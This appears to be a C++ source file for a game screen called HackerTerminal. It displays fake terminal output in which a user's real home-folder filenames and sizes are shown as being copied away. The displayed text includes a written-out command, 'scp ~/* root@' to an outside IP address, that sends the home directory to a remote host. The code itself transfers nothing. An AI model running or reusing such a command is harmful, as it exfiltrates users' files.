#include <chrono>

#include <boost/filesystem.hpp>
#include <boost/date_time.hpp>

#include <fmt/core.h>

#include "HackerTerminal.h"
#include "../TTUtils.h"

namespace fs = boost::filesystem;

namespace tt
{

namespace
{

std::string getHackerText()
{
    std::stringstream output;
    fs::path userfolder{ getUserFolder() };

    boost::posix_time::ptime tl = boost::posix_time::second_clock::local_time();
    output << "$> scp ~/* root@166.89.64.107:/subject_t/backups/"
        << fmt::format("{:04}-{:02}-{:02}", 
            static_cast<std::uint16_t>(tl.date().year()), 
            static_cast<std::uint16_t>(tl.date().month()), 
            static_cast<std::uint16_t>(tl.date().day()))
        << std::endl
        << std::endl;

    for(auto& entry : boost::make_iterator_range(fs::directory_iterator(userfolder), {}))
    {
        if (fs::is_directory(entry)) continue;

        auto size = static_cast<std::uint32_t>(fs::file_size(entry.path()) / 1024u);

        output <<
            fmt::format("{:<30} [*********] {:>6}KB   00:00", entry.path().filename().string(), size) << '\n';
    }

    output << std::endl
        << "$> logout"
        << std::endl
        << "Closing connection";

    return output.str();
}

}

HackerTerminal::HackerTerminal(ResourceManager & resmgr, sf::RenderTarget & target)
    : Screen(resmgr, target)
{
    setVisible(false);

    _monoFont = _resources.loadUniquePtr<sf::Font>("fonts/Anonymous.ttf");
    _soylText = std::make_shared<sf::Text>(getHackerText(), *_monoFont);
    _soylText->setCharacterSize(10);
    auto xTextPos = (_window.getSize().x - (_soylText->getLocalBounds().width + 20));
    _soylText->setPosition(xTextPos, 100.0);
    addDrawable(_soylText);
}

}  // namespace tt



